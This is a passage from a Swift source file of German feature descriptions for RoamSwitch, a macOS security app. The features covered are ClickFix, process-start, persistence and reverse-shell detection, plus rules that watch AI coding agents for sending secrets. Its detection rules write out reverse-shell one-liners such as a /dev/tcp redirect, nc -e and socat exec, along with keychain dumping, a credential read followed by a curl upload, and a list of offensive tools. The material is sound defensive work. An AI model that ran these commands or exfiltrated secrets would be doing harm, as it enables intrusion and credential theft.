                • Grenzen: macOS kann lokale Snapshots nach etwa 24 Stunden selbst löschen (bei wenig freiem Speicher früher); eine verschwundene Generation ist nicht nutzbar. Das Herausholen erfordert, dass RoamSwitch unter „Vollzugriff auf die Festplatte“ erlaubt ist (das Erstellen nicht).
                • MCP: Das schreibgeschützte `get_ransomware_recovery_snapshots` zeigt die Liste und die Empfehlung (es kann nichts wiederherstellen).
                • Pro: Dieses Fenster (Liste und Dateien herausholen) und das MCP-Tool sind Pro-Funktionen. Das Anlegen der Snapshots selbst funktioniert auch ohne Pro.
                • Schlägt das Erstellen eines Snapshots fehl (`tmutil localsnapshot` scheitert), steht der Grund im Fenster „Ransomware-Wiederherstellung …“ und in lastSnapshotError von `get_ransomware_recovery_snapshots`. Nach drei Fehlschlägen in Folge wird einmal eine Mitteilung gesendet. Nach einem Erfolg verschwindet sie.
                """,
                recommendation: "Lassen Sie die Vorab-Snapshots eingeschaltet. Bei einem Schaden trennen Sie zuerst das Netzwerk und holen die Dateien aus dem empfohlenen Vorab-Snapshot, nicht aus dem Erkennungs-Snapshot."
            ),
            LocalizedEntry(
                id: "feat_runtime_threat_containment",
                title: "Automatische Netzwerktrennung bei XProtect-Malware-Erkennung (Pro)",
                summary: "In dem Moment, in dem das in macOS integrierte XProtect / XProtect Remediator tatsächlich Malware erkennt oder entfernt, wird das Netzwerk in einem Notfall-Air-Gap getrennt. Eine Gatekeeper-Blockierung einer unsignierten App trennt das Netzwerk nicht; sie löst nur eine Benachrichtigung aus.",
                details: """
                • Signalquelle: Ein lang laufendes `/usr/bin/log stream`-Abonnement im ndjson-Format (blockierendes Warten statt Abfragen, daher nahezu keine CPU-Last im Leerlauf) überwacht XProtect-bezogene Systemprotokolle.
                • Auslöser: Nur wenn XProtect einen kritischen Malware-Fund protokolliert, greift die Air-Gap-Eindämmung (einschließlich WLAN-Funk aus), unabhängig von der Vertrauensstufe des Netzwerks.
                • Unterschied zu Gatekeeper: Alltägliche Gatekeeper-Ereignisse, etwa das Blockieren eines eigenen unsignierten Entwickler-Builds, lösen nur die Benachrichtigung „Gatekeeper hat eine unsignierte App am Ausführen gehindert“ aus.
                • Konsistenz: Nutzt dieselbe Klassifizierungslogik wie das manuelle Mac-Sicherheitsprotokoll-Audit.
                • Da keine EndpointSecurity-Berechtigung genutzt wird, handelt es sich um unmittelbare Eindämmung nach der Erkennung, nicht um Blockierung vor der Ausführung.
                • Standard: Wird bei erstmaliger Aktivierung von Pro automatisch eingeschaltet (mit einem einmaligen Hinweis, dass automatische Trennung aktiviert ist). Der Status ist über das MCP-Tool `get_runtime_threat_status` abrufbar; testen Sie mit „Air-Gap-Simulation bei Malware-Erkennung (Test)“.
                """,
                recommendation: "Lassen Sie diese Funktion als automatische Verteidigung im Verbund mit Apples eigener Malware-Engine aktiviert. Häufiges Ausführen eigener unsignierter Apps löst sie nicht aus, da eine reine Gatekeeper-Blockierung das Netzwerk niemals trennt."
            ),
            LocalizedEntry(
                id: "feat_clickfix_guard",
                title: "ClickFix-Schutz — automatische Blockierung bei verdächtigen Terminal-Befehlen (Pro, standardmäßig deaktiviert)",
                summary: "Erkennt aus dem Shell-Verlauf die ClickFix-Technik, bei der eine gefälschte Captcha- oder Fehlerseite Sie dazu verleitet, selbst einen Befehl einzufügen und auszuführen, und trennt das Netzwerk, um einen laufenden mehrstufigen Angriff zu stoppen.",
                details: """
                • Überwacht: Nur neu angehängte Zeilen von `~/.zsh_history` und `~/.bash_history` (bestehender Verlauf wird ignoriert).
                • Muster: (1) bekannte Reverse-Shell-Einzeiler (geteilt mit der statischen Signaturprüfung) und (2) doppelte Indirektion, die Base64-dekodierten Inhalt direkt in eine Shell oder `osascript` leitet. Ein einfaches `curl ... | bash`, wie es legitime Installer wie Homebrew nutzen, wird bewusst nicht gemeldet.
                • Reaktion: Air-Gap-Eindämmung (der WLAN-Funk wird nicht ausgeschaltet), automatisch nach maximal 10 Minuten wiederhergestellt. Die Benachrichtigung empfiehlt, Schlüsselbund, im Browser gespeicherte Passwörter und Krypto-Wallets zu überprüfen.
                • Ausnahme für bekannte Installer: Stimmt die URL im Befehl mit einem bekannten offiziellen Installer überein (rustup, Docker, Homebrew, uv/astral, deno, bun oder nvm), wird nur eine informative Benachrichtigung (ℹ️) gesendet statt das Netzwerk zu trennen — damit eine gewöhnliche Entwickler-Installation nicht versehentlich zum Air-Gap führt.
                • Warum nachträglich: Sobald eine Zeile im Verlauf steht, wurde der Befehl bereits ausgeführt, doch das sofortige Trennen des Netzwerks kann einen laufenden zweiten Download, eine aktive Reverse-Shell-Verbindung oder eine Zugangsdaten-Exfiltration noch stoppen.
                • Warum Gatekeeper es nicht verhindern kann: Es ist Ihre eigene legitime Shell, die genau das ausführt, was Sie eingegeben haben, sodass am Prozess selbst nichts ungewöhnlich wirkt.
                • Ergänzung: Der Zwischenablage-Schutz (feat_secret_leak_auditor) erkennt den Befehl bereits beim Kopieren und deckt so auch das Einfügen in Skripteditor, Spotlight und andere Stellen außer Terminal ab.
                • Standardmäßig deaktiviert: Eine automatische Netzwerktrennung, ausgelöst durch eine relativ neue Heuristik, daher Opt-in.
                • Wann erkannt wird: Bei den Standardeinstellungen von zsh wird ein Befehl erst beim Beenden der Shell in die Verlaufsdatei geschrieben und daher erst nach dem Schließen des Terminal-Tabs erkannt (gemessen; auch die von Terminal eingerichtete `~/.zsh_sessions/*.historynew` bleibt während der Sitzung leer). Mit `setopt INC_APPEND_HISTORY` in `~/.zshrc` wird direkt nach der Ausführung erkannt. Diese Grenze steht im Einschaltdialog, am Menüeintrag und in den Hinweisen von `get_guard_status`.
                • Prüfung vor dem Einfügen und die Einstellung für sofortiges Schreiben: Eingeschaltet prüft es auch, was Sie kopieren (es beobachtet nur den Änderungszähler der Zwischenablage und liest den Text, wenn er sich ändert; der Text wird nicht gespeichert, eine Mitteilung enthält nur den Regelnamen und die ersten Zeichen). Könnte der Text ein gefährlicher Befehl sein, werden Sie vor dem Einfügen gewarnt; die Taste „Zwischenablage leeren“ in der Mitteilung leert sie. Es wird nichts automatisch geleert oder isoliert, weil der Befehl noch nicht ausgeführt wurde. Ab macOS 15.4 braucht eine App eine Erlaubnis, die Zwischenablage zu lesen; ohne sie wird nichts gelesen, und der Zustand zeigt „Prüfung der Zwischenablage nicht erlaubt“. Für die Verzögerung im Verlauf fügt der Menüpunkt „Einstellung für sofortiges Schreiben des Verlaufs zu ~/.zshrc hinzufügen …“ mit Ihrer Zustimmung `setopt INC_APPEND_HISTORY` hinzu (er zeigt Zeile und Datei, kopiert ~/.zshrc vor dem Schreiben nach ~/.zshrc.roamswitch-backup und lässt sich rückgängig machen).
                """,
                recommendation: "Erwägen Sie die Aktivierung, wenn Sie befürchten, durch gefälschte Fehlerseiten oder Captchas zur Ausführung von Befehlen verleitet zu werden."
            ),
            LocalizedEntry(
                id: "feat_exec_recorder",
                title: "Aufzeichnung von Prozessstarts (eslogger, nur Benachrichtigung, Pro, standardmäßig aus)",
                summary: "Zeichnet mit Apples eigenem /usr/bin/eslogger (macOS 13+) auf, welche Programme auf diesem Mac starten, und benachrichtigt Sie, wenn ein Start zu einer verdächtigen Kombination passt. Es blockiert nie eine Ausführung und trennt nie das Netzwerk; das Protokoll bleibt auf diesem Mac.",
                details: """
                • Funktionsweise: Der privilegierte Helper startet `/usr/bin/eslogger exec fork exit` als Kindprozess und wertet dessen JSON-Strom aus. eslogger gehört zu macOS; RoamSwitch nutzt das EndpointSecurity-Entitlement weder noch beantragt es dieses. Es handelt sich also um nachträgliche Beobachtung, nicht um Blockieren vor der Ausführung.
                • Aufzeichnung der Prozesse, die Dateien öffnen (optional, standardmäßig aus, Unteroption dieses Rekorders): Die Meldung nennt den Prozess, der eine Köder-Zugangsdatei gelesen oder in die Einstellungsdatei eines KI-Agenten oder an einen Ort für automatisch startende Programme geschrieben hat (PID, übergeordneter Prozess, Befehl, Signatur). Der Helper startet dafür zwei weitere eslogger, einen für `open` und einen für `create rename unlink clone copyfile truncate`. eslogger kann nicht nach Pfad filtern, und `open` meldet jede vom Mac geöffnete Datei; der Helper sucht deshalb in jeder Zeile nur nach den beobachteten Pfaden, übergibt die wenigen Treffer an den Parser in der Sandbox und verwirft den Rest sofort. Behalten werden nur Ereignisse zu den beobachteten Dateien, etwa drei Minuten lang im Arbeitsspeicher; nichts wird auf die Festplatte geschrieben oder gesendet. Das kostet CPU: Der `open`-eslogger brauchte bei normaler Nutzung in der Messung etwa 5 % eines Kerns; der für Erstellen, Umbenennen und Löschen erhält viel weniger Ereignisse und belastet kaum. Der Helper misst beide getrennt und stoppt, wenn der Fünf-Minuten-Durchschnitt eines der beiden dauerhaft über seiner Grenze liegt, nur diesen einen, zuerst für 15 Minuten, dann für 1 Stunde, dann für 6 Stunden. Die Grenze beträgt für `open` 12 % eines Kerns (im Fenster „Prozessstart-Protokoll“ änderbar), für den anderen 3 %. Status und gemessene Last stehen im Fenster „Prozessstart-Protokoll“. Die Berechtigung „Zugriff auf die gesamte Festplatte“ ist dieselbe wie bei diesem Rekorder. Lässt sich der Prozess nicht nennen, nennt die Meldung den Grund (aus, wegen Last pausiert, noch nicht gestartet, läuft nicht).
                • Voraussetzungen: macOS 13 oder neuer und RoamSwitch unter „Vollzugriff auf die Festplatte“ erlaubt. Ohne ihn zeigt das Fenster „Prozessaufzeichnung nicht verfügbar: RoamSwitch unter „Vollzugriff auf die Festplatte“ erlauben (falls nicht aufgeführt, /Applications/RoamSwitch.app über „+“ hinzufügen)“ (oder dass eslogger fehlt) an und tut sonst nichts; es gibt keinen Rückfall auf ständiges Polling. Ereignisse vor dem Aktivieren der Aufzeichnung bzw. vor dem Start des Helpers werden nicht erfasst.
                • Korrelationsregeln (nur Benachrichtigung, standardmäßig leise, jede mit fester ID und MITRE-ATT&CK-Technik): Shell oder Skriptinterpreter direkt von Browser-, Office- oder Mail-App gestartet (exec.shell_from_app, T1059); nicht signiertes oder ad-hoc-signiertes Programm aus /tmp, /private/var/tmp, dem Temp-Ordner unter /var/folders, /Users/Shared oder mit Quarantäne-Attribut ausgeführt (exec.untrusted_location, T1204.002); `sh -c`-Einzeiler, der curl/wget an eine Shell weiterleitet, zusammen mit einem Verdachtsmerkmal wie IP-Adressen-URL, base64, eval, deaktivierter TLS-Prüfung oder Browser als Elternprozess (exec.pipe_to_shell, T1059.004); `osascript -e` mit do shell script plus base64/eval (exec.osascript_obfuscated, T1059.002); `xattr -d com.apple.quarantine` und innerhalb von 15 Minuten Ausführung dieser Datei (exec.quarantine_stripped_then_exec, T1553.001); nicht signiertes oder ad-hoc-signiertes Programm, das launchd aus einem in den letzten 24 Stunden geschriebenen LaunchAgent/LaunchDaemon startet (exec.launchd_untrusted_binary, T1543.001/.004); `security find-generic-password -w` oder `dump-keychain` unter einem Vorfahren, der keine Shell und nicht von Apple signiert ist (exec.keychain_access, T1555.001); ein nackter Interpreter außer osascript, der eine inline `-c`/`-e`/`-Command`-Einzeiler ausführt, die base64/eval mit einem Download oder einem exec-ähnlichen Aufruf kombiniert (exec.interpreter_inline_obfuscated, T1059); ein nicht von Apple signiertes Programm, das mit gesetztem DYLD_INSERT_LIBRARIES ausgeführt wird (exec.dyld_insert_libraries, T1574.006); `tmutil deletelocalsnapshots`/`thinlocalsnapshots`, ausgeführt von etwas anderem als RoamSwitch selbst oder einem Apple-Prozess (exec.ransomware_recovery_tampering, T1490); eine Befehlszeile, die direkt eine von RoamSwitch ausgelegte Köder-Zugangsdatendatei nennt (etwa ~/.aws/credentials oder ~/.env.backup, erkannt an der Markierung im Inhalt; echte Dateien treffen nie zu, Lesezugriffe über eine Bibliothek überlässt die Regel der Honeytoken-Überwachung) (exec.honeytoken_path, T1552.001). Zwei weitere Regeln zielen auf Angriffswerkzeuge, die von Skripten oder KI-Agenten gesteuert werden (etwa das HexStrike-AI-Backend): ein Prozess, der innerhalb von 30 Sekunden mit which/type nach 8 oder mehr verschiedenen Penetrationstest-Werkzeugen sucht (exec.offensive_tool_inventory, T1595), und eine Skript-Laufzeit oder ein KI-Coding-Agent, der innerhalb von 2 Minuten 3 oder mehr verschiedene solcher Werkzeuge startet (exec.offensive_tool_burst, T1595). Tippt eine Person dieselben Befehle im Terminal, wird nichts gemeldet. Ein einfaches, im Terminal getipptes `curl | sh` wird bewusst nicht gemeldet. Eine Reverse oder Bind Shell, die in einer `sh -c`-Befehlszeile oder in einem direkt gestarteten nc, ncat oder socat ausgeschrieben ist, wird ebenfalls gemeldet (exec.reverse_shell_argv, T1059.004): eine /dev/tcp- oder /dev/udp-Umleitung, die eine Shell trägt, eine mkfifo-Pipe, die mit nc, telnet, openssl s_client oder ssh verbunden ist, `nc -e <Shell>`, socat mit exec:<Shell> oder openssl s_client, das in eine Shell geleitet wird. Eine einfache Portprüfung wie `echo > /dev/tcp/host/22` und Text, der diese Befehle nur erwähnt, werden nicht gemeldet.
                • Shell, die ein Dienstkonto gestartet hat (exec.shell_from_service, T1505.003): Eine Benachrichtigung kommt, wenn ein Web- oder Anwendungsdienst-Prozess (httpd, nginx, php-fpm, java, tomcat, gunicorn, uwsgi, node und ähnliche) unter einem Dienstkonto (`_www` für den mit macOS gelieferten Apache, `www` für MacPorts usw.) direkt eine Shell (sh, bash, zsh usw.) oder einen python-, perl-, ruby- oder node-Einzeiler (-c / -e) startet. So führt eine Web-Shell einen Befehl aus. Konto und Dienstprozess müssen beide passen; ein Entwicklungsserver unter Ihrem eigenen Konto, apachectl, brew services und cron lösen deshalb nichts aus. Um Konten hinzuzufügen, führen Sie `defaults write com.tetsuharu.RoamSwitch RoamSwitch.ExecRule.ServiceUsers "Name,Name"` aus und starten die App neu oder schalten die Aufzeichnung von Prozessstarts aus und wieder ein (die Einstellung ergänzt nur die Liste; `_www` bleibt). Datenbankkonten wie `_mysql` und `_postgres` gehören nicht zur eingebauten Liste, weil eine Datenbank selbst Shells startet (zum Beispiel archive_command). Eine Web-Shell, die Code im Webserver-Prozess ausführt, ohne ein Programm zu starten, wird nicht gesehen.
                • Daten, die unterhalb eines KI-Coding-Agenten den Mac verlassen (exec.agent_sensitive_send und exec.agent_sensitive_then_send, T1048): Eine Benachrichtigung kommt, wenn ein Übertragungsprogramm, das unterhalb eines KI-Coding-Agenten (claude, codex, gemini, opencode, aider, goose, cursor-agent, openclaw, qwen, crush) gestartet wurde, eine Datei sendet, die den Mac nicht verlassen soll (SSH- und Cloud-Schlüssel, .env-Dateien, die Anmeldedateien des Agenten selbst, Browserdaten, Shell-Verlauf; .env.example, öffentliche Schlüssel und .pem-Dateien zählen nicht), oder ein Argument enthält, das wie ein Geheimnis aussieht. Die Programme sind curl und wget mit Inhalt oder Upload, scp, sftp, rsync, rclone, s3cmd, mc, aws s3 cp/mv/sync nach s3:// und aws s3api put-object, gsutil und gcloud storage nach gs://, az storage blob upload, nc, ncat, socat, telnet und ftp. Das Senden einer Datei hat hohe Schwere (Banner); ein geheimnisartiger Wert allein hat mittlere Schwere (nur Protokoll). Die zweite Regel (mittel) greift, wenn ein Befehl unterhalb desselben Agenten eine solche Datei gelesen hat und innerhalb von 5 Minuten ein Senden folgte, auch wenn das Senden keine Datei nennt (cat ~/.aws/credentials, danach curl -d @-). Ein Authorization-Header gilt nicht als Leck, und ein einfaches curl GET ist kein Senden. Grenzen: Gesehen werden nur Befehle, die der Agent als Prozesse startet. Die eigenen Dateizugriffe des Agenten, was er an seinen Modellanbieter sendet, git push und Skript-Laufzeiten, die selbst einen Socket öffnen (python -c, node -e), sind nicht sichtbar; geteilte oder codierte Argumente können die Prüfungen umgehen; ein Agent, dessen Prozessname node ist, wird nicht erkannt. Nur Benachrichtigung: Das Netzwerk wird nie isoliert.
                • Meldungen: eine Benachrichtigung (Pro) plus ein Eintrag in der Vorfallszeitleiste (Quelle execRecorder, Aktion „nur Benachrichtigung“). Eine Meldung löst nie von sich aus Air-Gap oder eine andere Isolation aus.
                • Speicherung: segmentierte JSON Lines unter /Library/Application Support/RoamSwitch/exec_log (nur für root lesbar: 0700/0600, da Befehlszeilen Geheimnisse enthalten können; App, Viewer und MCP-Server lesen nur über den privilegierten Helper), standardmäßig 200 MB / 14 Tage (änderbar), absturzsichere Rotation. Die Segmente sind per Hash-Kette verbunden, sodass gelöschte, geänderte oder gekürzte Segmente erkannt werden („Kette prüfen“); das ist manipulationserkennend, nicht manipulationssicher. Umgebungsvariablen werden nie aufgezeichnet, Befehlszeilenargumente können aber Geheimnisse enthalten.
                • Laststeuerung: begrenzte Warteschlange, die bei Überlast die ältesten Zeilen verwirft (gezählt und angezeigt), Neustarts mit exponentiellem Backoff; beim Ausschalten wird eslogger vollständig gestoppt.
                • Die Angriffswerkzeug-Liste von exec.offensive_tool_inventory und exec.offensive_tool_burst umfasst jetzt auch chisel, ligolo, ligolo-ng, suo5, stowaway, iox, venom, mimikatz, certipy, rubeus, kerbrute, bloodhound, sharphound, sliver, havoc, godzilla, behinder, antsword, weevely, fscan, gogo, ehole, oneforall, ksubdomain, dnsx, subzy, tlsx, cdncheck und die impacket-Werkzeuge. frp, nps, ngrok und ssh fehlen absichtlich, weil sie im Alltag benutzt werden. exec.offensive_tool_burst erfasst jetzt auch Programme, deren ausführbare Datei unter /Users, /tmp, /private/tmp, /var/folders und ähnlichen Orten liegt (in Go oder Rust geschriebene Agenten, die die Werkzeuge selbst starten). Ketten unter Terminal, ssh oder login bleiben wie bisher ausgenommen.
                • Ansicht und Export: Menü → Malware-Schutz → „Prozessstart-Protokoll …“ (Suche, Prozessbaum, Export als JSON Lines). MCP-Tools `search_exec_events` und `get_process_tree` (Pro, nur lesend). Ausgabesicherheit: Prozesspfade, Argumente und Signatur-IDs sind vom Angreifer kontrollierbar. Die Tools entfernen daher Steuerzeichen, begrenzen jeden String auf 300 Zeichen, maskieren bekannte Geheimnisformate und Werte geheimnisbenannter Flags als ****, und hängen nach dem JSON einen zweiten Textblock an, der sie als nicht vertrauenswürdige externe Daten kennzeichnet. Auch der Suchtext (`query`) wird nur gegen die bereits maskierte Befehlszeile geprüft (ein maskierter Wert ist per Suche nie auffindbar), muss mindestens 3 Zeichen lang sein, und Textsuchen sind pro Sitzung ratenbegrenzt; so lässt sich ein Geheimnis nicht Zeichen für Zeichen erraten. Die Ansicht der App selbst durchsucht Ihr eigenes Protokoll vollständig.
                """,
                recommendation: "Aktivieren Sie es, wenn Sie für die Vorfallsanalyse einen Ausführungsverlauf wünschen, und erlauben Sie RoamSwitch zuvor unter „Vollzugriff auf die Festplatte“. Betrachten Sie Meldungen als Hinweise, die Sie im Protokoll prüfen, nicht als Beweis für eine Kompromittierung."
            ),
            LocalizedEntry(
                id: "feat_persistence_monitor_guard",
                title: "Überwachung neuer Autostart-Registrierungen (LaunchAgent / LaunchDaemon) (Pro)",
                summary: "Überwacht neue LaunchAgent-/LaunchDaemon-Registrierungen in Echtzeit und benachrichtigt Sie, wenn eine davon direkt eine Shell oder einen Skript-Interpreter startet oder eine ausführbare Datei mit ungültiger Signatur registriert. Außerdem werden Sie benachrichtigt, wenn an einer Stelle, die von selbst ausgeführt wird (z. B. einer Shell-Startdatei), eine verdächtige Zeile auftaucht.",
                details: """
                • Überwacht: `~/Library/LaunchAgents`, `/Library/LaunchAgents` und `/Library/LaunchDaemons` per FSEvents (etwa 1,5 Sekunden Entprellung).
                • Beurteilung: Aktuelle Infostealer erreichen Persistenz, indem sie gültig Apple-signierte `/bin/bash` oder `/usr/bin/osascript` ein Base64-verstecktes Skript ausführen lassen. Da die Signatur des Interpreters selbst gültig ist, wird jede Registrierung, die einen bloßen Interpreter startet, unabhängig von der Signatur als verdächtig eingestuft, und die Skriptargumente werden zusätzlich durch die statische Signaturprüfung geleitet. Unsignierte oder ungültig signierte ausführbare Dateien werden ebenfalls gemeldet. Homebrew-Services-Wrapper sind ausgenommen.
                • Nur Erkennung: Ohne EndpointSecurity-Berechtigung kann das Schreiben der plist nicht verhindert werden. Sie wird innerhalb von etwa 1,5 Sekunden nach dem Schreiben bewertet und gemeldet.
                • Zusätzlich überwacht (Stellen, die von selbst ausgeführt werden): Shell-Startdateien (`~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.zlogin`, `~/.zlogout`, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bash_logout`, `~/.config/fish/config.fish`, `~/.config/fish/conf.d/*.fish`, `/etc/zshrc`, `/etc/zshenv`, `/etc/zprofile`, `/etc/zlogin`, `/etc/profile`, `/etc/bashrc`), `~/.ssh/rc` und `/etc/ssh/sshrc`, periodische Skripte (`/etc/periodic/{daily,weekly,monthly}`, `/usr/local/etc/periodic/*`, `/etc/{daily,weekly,monthly}.local`; nur wo vorhanden), die Ordner für Git-Hooks (`~/.git-templates/hooks`, `~/.config/git/hooks`, die `.git/hooks` der Arbeitskopien bis vier Ebenen unter dem Home-Ordner (höchstens 400) und der Ordner, den `core.hooksPath` nennt; nur ausführbare Hooks, nie `*.sample`; in Desktop, Documents, Downloads und Library wird nicht gesucht, außer in Projektordnern, die Sie registriert haben; ein Submodul oder verknüpftes Worktree, dessen `.git` eine Datei ist, wird bis zum eigentlichen Git-Verzeichnis verfolgt (`.git/modules/<Name>/hooks` oder das `.git/hooks` des Hauptrepositorys, das ein verknüpftes Worktree mitnutzt), ein gemeinsamer Ordner wird nur einmal beobachtet; Arbeitskopien über 400 hinaus werden nicht beobachtet, dann zeigt `get_guard_status` persistenceMonitor als partial und `scopeLimited` in den readers als true), Login-/Logout-Hooks (LoginHook / LogoutHook in `/Library/Preferences/com.apple.loginwindow.plist`) und Folder-Action-Skripte (`~/Library/Scripts/Folder Action Scripts` und `/Library/Scripts/Folder Action Scripts`; kompiliertes AppleScript wird mit osadecompile gelesen, `.scptd`-Bundles nicht). Prüfung alle 5 Sekunden; der erste Durchlauf erfasst nur den vorhandenen Stand und meldet nichts. `emond` ist nicht abgedeckt.
                • Python-Startdateien: Beobachtet werden auch die Dateien, die Python bei jedem Start selbst ausführt. Das sind die `.pth`-Dateien, `sitecustomize.py` und `usercustomize.py` in Pythons eigenen site-Ordnern und in virtuellen Umgebungen unter dem Home-Ordner (vier Ordner tief gesucht und jede Minute neu; Desktop, Documents, Downloads und Library werden übersprungen) sowie das Modul, das eine `.pth`-Datei aus ihrem eigenen Ordner importiert. Gemeldet wird nur Code, der drei oder mehr Arten von Zugangsdaten-Speichern ausliest, Daten dekodiert und direkt ausführt, Inhalte herunterlädt und direkt ausführt oder die Form einer Reverse Shell hat; ein Modul, das seine Zeichenketten versteckt, wird nicht erkannt.
                • Beurteilung (die Stellen oben): Gemeldet wird nur eine Zeile in der Form einer Reverse-Shell, von Dekodieren-und-Ausführen, Herunterladen-und-Ausführen oder eines Programms aus einem temporären Ordner (`/tmp`, `/var/folders` usw.). Eine gewöhnliche neue Zeile wird nicht gemeldet. Shell-Startdateien, `~/.ssh/rc` und Git-Hooks bearbeitet der Besitzer ständig; eine schon vorhandene verdächtige Zeile wird daher nicht erneut gemeldet, nur eine neu hinzugekommene. Ein Login-/Logout-Hook wird schon dafür gemeldet, dass er gesetzt wurde.
                • Standard: Bei Pro standardmäßig aktiv. Umschaltbar unter Malware-Schutz → „Neue Autostart-Registrierungen überwachen (LaunchAgent/Daemon) (Pro)“.
                """,
                recommendation: "Erhalten Sie eine Warnung zu einer unbekannten Registrierung, prüfen Sie die in der Benachrichtigung gezeigte plist und löschen Sie sie, wenn Sie sie nicht kennen. Direkt nach der Installation einer legitimen App ist es meist unbedenklich. Bei einer Warnung zu einer Startdatei o. Ä. prüfen Sie die in der Benachrichtigung gezeigte Zeile und löschen Sie sie, wenn Sie sie nicht kennen."
            ),
            LocalizedEntry(
                id: "feat_web_worker_crash_guard",
                title: "Abstürze von Webserver-Workern überwachen (Pro)",
                summary: "Benachrichtigt Sie, wenn nginx-, Apache- oder PHP-FPM-Worker in kurzer Zeit wiederholt abstürzen. Der Master-Prozess ersetzt jeden Worker, daher sieht keine andere Prüfung das.",
                details: """
                • Beobachtet: die Fehlerprotokolle von nginx, Apache und PHP-FPM (Homebrew und das in macOS eingebaute) und jedes in der nginx- oder PHP-FPM-Konfiguration genannte `error_log`. Alle 5 Sekunden werden nur die seit dem letzten Lesen hinzugekommenen Zeilen gelesen.
                • Beurteilung: drei Beendigungen innerhalb von fünf Minuten durch ein Absturzsignal (SIGSEGV, SIGABRT, SIGBUS, SIGILL, SIGFPE). SIGKILL und Ähnliches zählt nicht.
                • Nur Benachrichtigung: einmal pro Server und Stunde; nichts wird gestoppt oder gesperrt.
                • Standard: mit Pro aktiv.
                • Zustand: Es gibt keinen Schalter; es startet mit der App. Die Zahl der verfolgten Protokolle steht im Fenster „Web-Shell- und andere Erkennungsregeln …“ des Menüs. Gibt es kein Protokoll zu verfolgen (z. B. auf einem Mac ohne Webserver), wird nichts überwacht, und webWorkerCrashWatch in `get_guard_status` ist off (Grund log_not_found). Die Mitteilung gibt es nur mit Pro.
                """,
                recommendation: "Prüfen Sie das Fehlerprotokoll mit `grep signal` und suchen Sie im Zugriffsprotokoll zur selben Zeit die Anfragen unmittelbar vor jedem Absturz. Prüfen Sie außerdem, ob für nginx oder Apache eine Sicherheitskorrektur fehlt."
            ),
            LocalizedEntry(
                id: "feat_docker_event_guard",
                title: "Erkennung privilegierter Docker-Container & docker.sock-Mounts (Pro, standardmäßig deaktiviert)",
                summary: "Benachrichtigt Sie beim Start eines Containers über riskante Docker-Einstellungen, die zu einem Container-Ausbruch führen können, etwa Container, die mit `--privileged` gestartet werden oder `/var/run/docker.sock` eingebunden haben.",
                details: """
                • Funktionsweise: Alle 20 Sekunden findet `docker ps` nur neu gestartete Container, und `docker inspect` prüft deren Einstellungen. Das Erkennungsformat ist identisch mit der Linux-Version, sodass beide Plattformen dieselben Bedingungen melden.
                • Nur Benachrichtigung: Es handelt sich um eine riskante Konfiguration, nicht um eine bestätigte Kompromittierung (ein Überwachungs-Agent kann absichtlich privilegiert laufen), daher wird nichts automatisch blockiert.
                • Standardmäßig deaktiviert: Die meisten Nutzer verwenden kein Docker, daher ist die Funktion auch bei Pro standardmäßig aus.
                • Test: „⚠️ Docker-Risikoerkennungs-Simulation (Testmodus)…“ prüft den Benachrichtigungspfad, ohne Docker zu berühren.
                • Container der Pentest-Umgebung Exegol: Trägt ein wegen Privilegiertem Modus o. Ä. gemeldeter Container `org.exegol.*`-Labels oder nutzt er ein offizielles Exegol-Image (`registry.exegol.com/exegol`, `nwodtuhs/exegol`), erhält die Meldung eine weitere Zeile dazu. Ein Exegol-Container allein löst nie eine Meldung aus (viele starten ihn absichtlich).
                • Was nicht sichtbar ist: Container, die beim Einschalten bereits laufen, werden nicht geprüft. Die Prüfung läuft alle 20 Sekunden; ein Container, der dazwischen startet und endet, wird nicht gesehen. Solange docker nicht antwortet (Docker Desktop gestoppt oder nicht installiert), wird nichts erkannt, und der Menüeintrag erhält ⚠️ und den Grund.
                """,
                recommendation: "Nutzen Sie Docker für die Entwicklung, aktivieren Sie diese Funktion, um Risiken eines Container-Ausbruchs früh zu erkennen."
            ),
            LocalizedEntry(
                id: "feat_reverse_shell_watch",
                title: "Reverse-Shell-Erkennung in Echtzeit (Pro)",
                summary: "Prüft alle paar Sekunden, ob Ein- und Ausgabe einer Shell oder eines Interpreters des angemeldeten Benutzers eine ausgehende TCP-Verbindung zu einem externen Server sind, und meldet den Verdacht auf eine Reverse Shell. Nur Pro, standardmäßig an.",
                details: """
                • Öffnen: über den Menüleisteneintrag „🐚/✅ Reverse Shells dauerhaft überwachen (Pro)“ umschalten.
                • Funktionsweise: Alle 4 Sekunden liest es mit libproc die Prozessliste und die offenen Dateideskriptoren jedes Prozesses. Es wird kein externer Befehl wie lsof ausgeführt, und der Inhalt der Verbindung wird nie gelesen.
                • Erkannte Formen: (1) Eine Shell oder ein Interpreter (sh, bash, zsh, python, perl, ruby, php, node u. ä.), deren Eingabe (fd 0) und Ausgabe (fd 1) dieselbe aufgebaute ausgehende TCP-Verbindung sind (`bash -i >& /dev/tcp/H/P 0>&1` oder ein Python-Einzeiler, der einen Socket per dup2 übernimmt). (2) nc, ncat oder socat, die mit `-e`, `--exec` oder `exec:` ein Programm an die Verbindung hängen. (3) Ein nc neben einer vom selben übergeordneten Prozess gestarteten Shell, deren Ein- und Ausgabe Pipes sind (die `mkfifo`-Schleife; das mit dem Mac gelieferte nc hat kein `-e`, deshalb wird diese Form dort benutzt).
                • Gegenstellen: standardmäßig nur öffentliche Adressen. Heimnetz, Tailscale (100.64.0.0/10) und Container werden nicht beobachtet, damit Remote-Entwicklung und ProxyCommand keinen Fehlalarm auslösen. Der Menüpunkt „Reverse-Shell-Erkennung: Gegenstellen im lokalen Netzwerk einbeziehen“ (oder `defaults write com.tetsuharu.RoamSwitch RoamSwitch.ReverseShellWatch.IncludePrivateV1 -bool true`) nimmt sie dazu; Loopback wird nie beobachtet.
                • Was als ausgehend gilt: Eine an einem Listener angenommene Verbindung oder eine mit lokalem Port unter 49152 wird nicht als Reverse Shell behandelt.
                • Wann gemeldet wird: nur wenn derselbe Zustand in zwei aufeinanderfolgenden Scans auftritt, einmal pro Prozess. Derselbe Programmname mit derselben Gegenstelle wird höchstens alle 15 Minuten gemeldet.
                • Nur Hinweis: Es beendet nie selbstständig den Prozess und trennt nie das Netzwerk.
                • Grenzen: Die App liest die Prozesse des angemeldeten Benutzers, die Prozesse anderer Konten einschließlich root liest der root-Helper. Ein Helper, der älter als die App ist, wird nicht gefragt, dann ist ein root-Prozess nicht sichtbar. Programme mit einem Namen außerhalb der Liste werden nicht beobachtet, Verbindungen zu privaten Adressen nur dann nicht, wenn der genannte Menüpunkt aus ist. Eine nur in einer Skriptdatei stehende Reverse Shell ist erst sichtbar, wenn sie sich verbindet.
